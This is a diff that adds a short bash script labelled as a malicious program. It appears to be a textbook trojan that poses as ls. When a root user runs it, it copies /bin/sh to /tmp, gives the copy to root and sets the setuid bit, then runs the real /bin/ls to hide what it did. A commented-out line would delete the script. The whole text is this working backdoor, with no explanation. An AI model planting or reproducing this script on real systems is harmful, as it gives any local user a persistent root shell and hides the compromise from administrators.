@@ -1,0 +1,9 @@
+#!/bin/bash
+
+# Ulrika's malicious program
+
+cp /bin/sh /tmp/Ulrika
+chown root /tmp/Ulrika
+chmod 4755 /tmp/Ulrika
+/bin/ls
+# rm $0
